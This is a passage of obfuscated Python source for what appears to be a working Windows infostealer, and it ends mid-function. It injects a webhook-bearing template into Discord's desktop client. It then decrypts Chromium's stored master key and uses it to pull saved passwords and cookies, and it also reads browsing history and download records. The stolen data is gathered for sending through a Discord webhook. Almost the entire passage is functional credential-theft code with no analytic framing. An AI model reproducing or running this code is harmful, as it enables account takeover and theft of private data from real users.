            if not os.path.exists(VFUQUMGZGOSMXSHXLXNEGIPHVFANPCATVNFAMQNDVTNONCPSIPCVQNJLAOJJCEYYSHVY):
                continue

            TRXLFQXCWWATRQLUADKHZKRLFFZMWMGSOBYRZIBMXQBKVLWWPQHBSFZCBOJCATKLHPUVYZWSQWJGMKDMJJTNJCFVSBV_info = AWTODVTGRNFIHPJPYUGWNGZAFZESLVGFXFWJKNZCDKVZCLVKKIEYKEMHGVDEXXAPOUJNCXLQAPTSTIVYCJQKTJMT(VFUQUMGZGOSMXSHXLXNEGIPHVFANPCATVNFAMQNDVTNONCPSIPCVQNJLAOJJCEYYSHVY)
            if TRXLFQXCWWATRQLUADKHZKRLFFZMWMGSOBYRZIBMXQBKVLWWPQHBSFZCBOJCATKLHPUVYZWSQWJGMKDMJJTNJCFVSBV_info is not None:
                TRXLFQXCWWATRQLUADKHZKRLFFZMWMGSOBYRZIBMXQBKVLWWPQHBSFZCBOJCATKLHPUVYZWSQWJGMKDMJJTNJCFVSBV, TRXLFQXCWWATRQLUADKHZKRLFFZMWMGSOBYRZIBMXQBKVLWWPQHBSFZCBOJCATKLHPUVYZWSQWJGMKDMJJTNJCFVSBV_file = TRXLFQXCWWATRQLUADKHZKRLFFZMWMGSOBYRZIBMXQBKVLWWPQHBSFZCBOJCATKLHPUVYZWSQWJGMKDMJJTNJCFVSBV_info
                
                HSNXWJMGQCTOGWXHVOLIBJNGCJSEYGPJRHGIECIZLTMUYYYWNNVSCFPQWBUZYFOQMAYVOMCYBWBHJSXOLENIGVNWHMFKGWFHPCTA = TRXLFQXCWWATRQLUADKHZKRLFFZMWMGSOBYRZIBMXQBKVLWWPQHBSFZCBOJCATKLHPUVYZWSQWJGMKDMJJTNJCFVSBV + '\\index.js'
                
                if not os.path.exists(HSNXWJMGQCTOGWXHVOLIBJNGCJSEYGPJRHGIECIZLTMUYYYWNNVSCFPQWBUZYFOQMAYVOMCYBWBHJSXOLENIGVNWHMFKGWFHPCTA):
                    open(HSNXWJMGQCTOGWXHVOLIBJNGCJSEYGPJRHGIECIZLTMUYYYWNNVSCFPQWBUZYFOQMAYVOMCYBWBHJSXOLENIGVNWHMFKGWFHPCTA, 'w').close()

                with open(HSNXWJMGQCTOGWXHVOLIBJNGCJSEYGPJRHGIECIZLTMUYYYWNNVSCFPQWBUZYFOQMAYVOMCYBWBHJSXOLENIGVNWHMFKGWFHPCTA, 'w', encoding='utf-8') as f:
                    f.write((SHKIIFKRILJCPGVJFMRPQWZQWSLJHCSSEVECGVMRCPESPIDYON).replace('discord_desktop_core-1', TRXLFQXCWWATRQLUADKHZKRLFFZMWMGSOBYRZIBMXQBKVLWWPQHBSFZCBOJCATKLHPUVYZWSQWJGMKDMJJTNJCFVSBV_file)
                            .replace(r"%WEBHOOK_HERE%", MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX)
                            .replace(r"%EMBED_COLOR%", str(DNELUTIPWJOZTULOMFHJWJJZAFVXALFGOVGTTHOTYCMNDYPADROGVNVBFJXRN))
                            .replace(r"%USERNAME%", HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX)
                            .replace(r"%IP_PUBLIC%", YKQCOOZPWSWEUWYGMNCVFYKYFCBHHNFUIYMZJDPHBSAACEUZZSTXZBXEPJDRQSECHZYJFC)
                            .replace(r"%EMBED_NAME%", LMRAEHHWDRLRJFXVQBVICRAQPOCOVBBOLNBRUAOGUGDKOMAHPTNYFEGZRVQDWHXOVMUFXGZRSUEBDCIH)
                            .replace(r"%EMBED_ICON%", CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI)
                            .replace(r"%FOOTER_TEXT%", VESUBNJMUJUISETCMMULDLVANAOHCUJNNPPZZGWNXHHOWJTLXDHVREXNPRYKFTLEOQRIDGRTNFKWSHEYECXVDJMQ)
                            .replace(r"%WEBSITE%", YZMOKMGQUNVHCFDRUNXFENHMLFMLPOJCUENHLNQKSLPOMQAACRLFPXXNXONCHHZSGKZKQK))
                PTXOZGLVEPDFEVWADCJZRKZTAFVRBGBVCIHSUAGFBVSXCHUBJYNBGZATWPKIBCXZTFCFOXHGVZ(VFUQUMGZGOSMXSHXLXNEGIPHVFANPCATVNFAMQNDVTNONCPSIPCVQNJLAOJJCEYYSHVY)
    RTTHIJZJQGYXHRNXLYMLITPJDSTISUFUMZEUSAGMMNYYKSAXLUHAWHEDKVSJLEJZFWICFUSKZWCOFCVVQMPEIHGOORGILKEQ()

def KCAEDQSOVCGKAGHVMMHMGZZXBMROYAWACJSXTZIVWCAQYEYVIQHVXUSNDNEPYHKJRFYUKGMDQQUVDV():
    import os
    import io
    import zipfile
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from discord import SyncWebhook, Embed, File
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    BZNMLSTVQWQVIBDJQQQGBDVQLTROPMZEXDKXDOVQNHCCJSUCMLZHFMOSRXICUQPZHHKUFON = []
    AJQOFARZPGUNIFDJQLUAUBLMYNPOFUARQPCQZXLKJITSITSVGJQKDEWWZTLLIRNOVY = []
    SJYEKDCOMARMSWJAXAWSVFOQGDRQHDCXHOUAOWTKQGQGCDTXSEZTPCISTJBTKBIRLKTQZKSEGVXYSPWZWZJECRDQKHM = []
    NNMLOWKYMLLTYYDJVHZYFXTGEGTWHHUBAMIHKLCQCUSZNXOQJAOHUCLSSCGXAUDRFXDHKUGOHVLSQHMKJKM = []
    AGSFZGCLCUZORPQCDRNRYISKBSGCCRIJRSUJPHIKPRLSRGKQMSELTWMNKW = []
    RDJZNUWNQXXDBTELFBZCMVISJQTEAEADCCROLRIRFOFDFYUJECMMKPURKX = []

    def WUQSGLSEJEDQENBHHOBLAIETSREYKLDAKZDSUFAPPBVMGANDXASOGDHSCKZQCPPTRNHLKZRYVDOLQVNYBVSFTEHYKBA(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG):
        if not os.path.exists(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG):
            return None

        try:
            with open(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG, 'r', encoding='utf-8') as v4r_f:
                EWQYVONLUIGJAWEERKVERJRNXVXVTNSLWTBRTNWRYHOZCRTTWHXUYYLNIVJGKRFPT = json.load(v4r_f)

            TTYXNSTTGNZSZQLUQGPGNPVHJQETSWQLMBOUXHZTMLBAGAUBSPZOUKKMSGIGASZIUIPC_key = base64.b64decode(EWQYVONLUIGJAWEERKVERJRNXVXVTNSLWTBRTNWRYHOZCRTTWHXUYYLNIVJGKRFPT["os_crypt"]["encrypted_key"])[5:]
            NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU = win32crypt.CryptUnprotectData(TTYXNSTTGNZSZQLUQGPGNPVHJQETSWQLMBOUXHZTMLBAGAUBSPZOUKKMSGIGASZIUIPC_key, None, None, None, 0)[1]
            return NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU
        except:
            return None

    def UCAQXCUKNZITJPNDAVPSNLJZVQZQNICPJKLXONRQTBNYLMZSEACESTGVRLJLLAARKYTDOARQRFCNQKVDMMWDQBTPRANNWJKTBWHQ(BTBWQEPJCBZYLUVXFFCUAGICIDUGRGYPTYMETUONRSJHHRZRYMXERMUOIGK, NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU):
        try:
            ULCMLKXALDGBNXBYCKLALSZQMALYHUVFPTCBMGPYLGNGULWQDLORSDHQFONGUXHTWWPLUKHGSVVLXOUKY = BTBWQEPJCBZYLUVXFFCUAGICIDUGRGYPTYMETUONRSJHHRZRYMXERMUOIGK[3:15]
            SBIBKQUUCWULEWXHXOEDIVZQPGNNPOWTLBAUVYFRWFFVLPCTJPCKUCOKSMXITICRWEVFDVRJBFAJIHWZVTEWYZSBDBJYLUGLEO = BTBWQEPJCBZYLUVXFFCUAGICIDUGRGYPTYMETUONRSJHHRZRYMXERMUOIGK[15:-16]
            FPVETMMECBNGVZGNXLWZWNZRRPOHMNLNQHLNEJETODKGPFHVNKCTRDNQVMTRVWYQNDIFPATDFIQQWDDONLJLWVCWCNOPNRREZJY = BTBWQEPJCBZYLUVXFFCUAGICIDUGRGYPTYMETUONRSJHHRZRYMXERMUOIGK[-16:]
            EJCKAWSSHKJZJMWIPDIXJHYUKIJBFWCDDCSBCXLJNNTQAVFGSOUBHNFQRTPULOLEFUBKXOKWTEATCAWYXDDCMJKOZSME = Cipher(algorithms.AES(NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU), modes.GCM(ULCMLKXALDGBNXBYCKLALSZQMALYHUVFPTCBMGPYLGNGULWQDLORSDHQFONGUXHTWWPLUKHGSVVLXOUKY, FPVETMMECBNGVZGNXLWZWNZRRPOHMNLNQHLNEJETODKGPFHVNKCTRDNQVMTRVWYQNDIFPATDFIQQWDDONLJLWVCWCNOPNRREZJY))
            ESGWYPCMXXZSSURLERFIGFNBHOZCIRXTXOQLHVHJPIGDUQEUBCVVKPZZBLDHAMBICUXAVOLOWRFYT = EJCKAWSSHKJZJMWIPDIXJHYUKIJBFWCDDCSBCXLJNNTQAVFGSOUBHNFQRTPULOLEFUBKXOKWTEATCAWYXDDCMJKOZSME.decryptor()
            OAYFPZPSPBTBMBKQRJRQLBUAQYNLBBKZEXDZUTVDKVPITUSSGWZEKUIGYV = ESGWYPCMXXZSSURLERFIGFNBHOZCIRXTXOQLHVHJPIGDUQEUBCVVKPZZBLDHAMBICUXAVOLOWRFYT.update(SBIBKQUUCWULEWXHXOEDIVZQPGNNPOWTLBAUVYFRWFFVLPCTJPCKUCOKSMXITICRWEVFDVRJBFAJIHWZVTEWYZSBDBJYLUGLEO) + ESGWYPCMXXZSSURLERFIGFNBHOZCIRXTXOQLHVHJPIGDUQEUBCVVKPZZBLDHAMBICUXAVOLOWRFYT.finalize()
            return OAYFPZPSPBTBMBKQRJRQLBUAQYNLBBKZEXDZUTVDKVPITUSSGWZEKUIGYV.decode()
        except:
            return None
        
    def RSHHKOVUYAKOLGCFMCLZQPFCCCPRVVKSXFMCFPKCKWHWUIWBNDHBIYRYURLZSIEZLNGSUPYIXATZBK(KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB, UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP, NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU):
        NEMRFSDMGVOQZDGBMOPJXHQQLWPHKYZGHERINATTTYWOQIVZKVQECNJHKKNQOQXANYOZMMMGBWEZ_db = os.path.join(UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP, 'Login Data')
        if not os.path.exists(NEMRFSDMGVOQZDGBMOPJXHQQLWPHKYZGHERINATTTYWOQIVZKVQECNJHKKNQOQXANYOZMMMGBWEZ_db):
            return

        QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(NEMRFSDMGVOQZDGBMOPJXHQQLWPHKYZGHERINATTTYWOQIVZKVQECNJHKKNQOQXANYOZMMMGBWEZ_db)
        disk_conn.backup(QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN)
        disk_conn.close()
        JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ = QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN.cursor()
        JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            QYYDTHGXWVYSEEVNVTRIBNRWDSRERIQCIWAWHXAEVGPGPXKNTKRCVXTGSGZLGK =          f"- Url      : {v4r_row[0]}"
            DHYAMQDTTDNRQRZIOQNHVHPUVDRLCXTMBGAWMQDAMZYTOCVDAYPLUQFOPWWNHRJQUJWH =     f"  Username : {v4r_row[1]}"
            NEMRFSDMGVOQZDGBMOPJXHQQLWPHKYZGHERINATTTYWOQIVZKVQECNJHKKNQOQXANYOZMMMGBWEZ =     f"  Password : {UCAQXCUKNZITJPNDAVPSNLJZVQZQNICPJKLXONRQTBNYLMZSEACESTGVRLJLLAARKYTDOARQRFCNQKVDMMWDQBTPRANNWJKTBWHQ(v4r_row[2], NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU)}"
            KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB_name = f"  Browser  : {KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB}"
            BZNMLSTVQWQVIBDJQQQGBDVQLTROPMZEXDKXDOVQNHCCJSUCMLZHFMOSRXICUQPZHHKUFON.append(f"{QYYDTHGXWVYSEEVNVTRIBNRWDSRERIQCIWAWHXAEVGPGPXKNTKRCVXTGSGZLGK}\n{DHYAMQDTTDNRQRZIOQNHVHPUVDRLCXTMBGAWMQDAMZYTOCVDAYPLUQFOPWWNHRJQUJWH}\n{NEMRFSDMGVOQZDGBMOPJXHQQLWPHKYZGHERINATTTYWOQIVZKVQECNJHKKNQOQXANYOZMMMGBWEZ}\n{KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB_name}\n")

        QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN.close()

    def LURSOUZGTHNVCPXRHWSFYEXDIQVUEEFNWAXIQHHSPQOXGSWJQDCMKDYQRDMTJZMMCIPWJVGOCEXKCCBYLKR(KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB, UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP, NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU):
        XGDVQDGTDUBQMMXWYXIWULURGXNQBDWZPHQUIISEURRJZQBOWGWJZVIEDFNOUNOKCKSOEVCUQUVBXGD = os.path.join(UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP, 'Network', 'Cookies')
        if not os.path.exists(XGDVQDGTDUBQMMXWYXIWULURGXNQBDWZPHQUIISEURRJZQBOWGWJZVIEDFNOUNOKCKSOEVCUQUVBXGD):
            return

        QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(XGDVQDGTDUBQMMXWYXIWULURGXNQBDWZPHQUIISEURRJZQBOWGWJZVIEDFNOUNOKCKSOEVCUQUVBXGD)
        disk_conn.backup(QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN)
        disk_conn.close()
        JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ = QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN.cursor()
        JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            QYYDTHGXWVYSEEVNVTRIBNRWDSRERIQCIWAWHXAEVGPGPXKNTKRCVXTGSGZLGK =          f"- Url     : {v4r_row[0]}"
            XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ =         f"  Name    : {v4r_row[1]}"
            QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG =         f"  Path    : {v4r_row[2]}"
            XEQVZXETQYTCCWQDEINRFWTVPJZRKLONIAXQXEUHXRPIHYEOINWCDCCGLIOVTHXRXLSD =       f"  Cookie  : {UCAQXCUKNZITJPNDAVPSNLJZVQZQNICPJKLXONRQTBNYLMZSEACESTGVRLJLLAARKYTDOARQRFCNQKVDMMWDQBTPRANNWJKTBWHQ(v4r_row[3], NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU)}"
            XDWGMMPBZCHUWILTZVDIOHVNXWLFKIJDLMJQPPKCRXULRRHGWDUBLWWABGWFFYAXWWWMBURIZYKLAIZYFJVPAVH =       f"  Expire  : {v4r_row[4]}"
            KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB_name = f"  Browser : {KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB}"
            AJQOFARZPGUNIFDJQLUAUBLMYNPOFUARQPCQZXLKJITSITSVGJQKDEWWZTLLIRNOVY.append(f"{QYYDTHGXWVYSEEVNVTRIBNRWDSRERIQCIWAWHXAEVGPGPXKNTKRCVXTGSGZLGK}\n{XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ}\n{QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG}\n{XEQVZXETQYTCCWQDEINRFWTVPJZRKLONIAXQXEUHXRPIHYEOINWCDCCGLIOVTHXRXLSD}\n{XDWGMMPBZCHUWILTZVDIOHVNXWLFKIJDLMJQPPKCRXULRRHGWDUBLWWABGWFFYAXWWWMBURIZYKLAIZYFJVPAVH}\n{KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB_name}\n")

        QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN.close()

    def YXHAZVVFLPTZFKNRVBPOCSMENSRRYBKIXXLWRPYVYGBSCXWVHHWLTFJ(KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB, UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP):
        TTJINCMHNWYWACJGRGDWWTVHGPYZJUVJLGBZFDXROOEXIPHVKHJFDSEXLVHBSI = os.path.join(UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP, 'History')
        if not os.path.exists(TTJINCMHNWYWACJGRGDWWTVHGPYZJUVJLGBZFDXROOEXIPHVKHJFDSEXLVHBSI):
            return
        
        QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(TTJINCMHNWYWACJGRGDWWTVHGPYZJUVJLGBZFDXROOEXIPHVKHJFDSEXLVHBSI)
        disk_conn.backup(QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN)
        disk_conn.close()
        JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ = QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN.cursor()
        JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            QYYDTHGXWVYSEEVNVTRIBNRWDSRERIQCIWAWHXAEVGPGPXKNTKRCVXTGSGZLGK =          f"- Url     : {v4r_row[0]}"
            KFKDMINUGCUTZZSMYZLDMLHRMGIEGUGMNDZDGMGIYTCCMOCIGYLFKIMRVNSMOUMEAJUDFOPMUUX =        f"  Title   : {v4r_row[1]}"
            GGUVWUOXKJASCRPXOZDLJAYXXKQLVXZRDOSEIZMDHBHPRRBFVJOMZVLTND =         f"  Time    : {v4r_row[2]}"
            KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB_name = f"  Browser : {KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB}"
            SJYEKDCOMARMSWJAXAWSVFOQGDRQHDCXHOUAOWTKQGQGCDTXSEZTPCISTJBTKBIRLKTQZKSEGVXYSPWZWZJECRDQKHM.append(f"{QYYDTHGXWVYSEEVNVTRIBNRWDSRERIQCIWAWHXAEVGPGPXKNTKRCVXTGSGZLGK}\n{KFKDMINUGCUTZZSMYZLDMLHRMGIEGUGMNDZDGMGIYTCCMOCIGYLFKIMRVNSMOUMEAJUDFOPMUUX}\n{GGUVWUOXKJASCRPXOZDLJAYXXKQLVXZRDOSEIZMDHBHPRRBFVJOMZVLTND}\n{KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB_name}\n")

        QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN.close()

    def BNHLXPKYKQCWGSOPPNVPDRSTSVYLWGCELZKNBQAHKMGYDFMUPFKIVOEPYJFGTSWEYXFEXMXDMZWILRKYUHRDPAPODIEKJQHCQNXC(KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB, UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP):
        NWIISECQOHZDSAENWADGQXTAUKZNKUFSZFHNOHPMDSCUOYVATGJNQFWCURIJBEBQI = os.path.join(UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP, 'History')
        if not os.path.exists(NWIISECQOHZDSAENWADGQXTAUKZNKUFSZFHNOHPMDSCUOYVATGJNQFWCURIJBEBQI):
            return

        QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(NWIISECQOHZDSAENWADGQXTAUKZNKUFSZFHNOHPMDSCUOYVATGJNQFWCURIJBEBQI)
        disk_conn.backup(QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN)
        disk_conn.close()
        JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ = QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN.cursor()
        JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ.execute('SELECT tab_url, target_path FROM downloads')
        for row in JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ.fetchall():
            if not row[0] or not row[1]:
                continue
            QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG =         f"- Path    : {row[1]}"
            QYYDTHGXWVYSEEVNVTRIBNRWDSRERIQCIWAWHXAEVGPGPXKNTKRCVXTGSGZLGK =          f"  Url     : {row[0]}"
            KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB_name = f"  Browser : {KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB}"
            NNMLOWKYMLLTYYDJVHZYFXTGEGTWHHUBAMIHKLCQCUSZNXOQJAOHUCLSSCGXAUDRFXDHKUGOHVLSQHMKJKM.append(f"{QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG}\n{QYYDTHGXWVYSEEVNVTRIBNRWDSRERIQCIWAWHXAEVGPGPXKNTKRCVXTGSGZLGK}\n{KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB_name}\n")

        QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN.close()

    def PVNDBWKXHPFJPIVTDUUOXMGNOLCNREPIMIXLFUFWWNHGBSLSJXZFMRJKSHLDLXUWNXXMBSOLJYFRENT(KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB, UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP, NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU):
        DTSWWWOISETNXXYLLTSNYDFIXPQNWPKYYNCETHHYEDPAEUPELVQFOGZTIIXLRMIJLY = os.path.join(UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP, 'Web Data')
        if not os.path.exists(DTSWWWOISETNXXYLLTSNYDFIXPQNWPKYYNCETHHYEDPAEUPELVQFOGZTIIXLRMIJLY):
            return

        QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN = sqlite3.connect(":memory:")
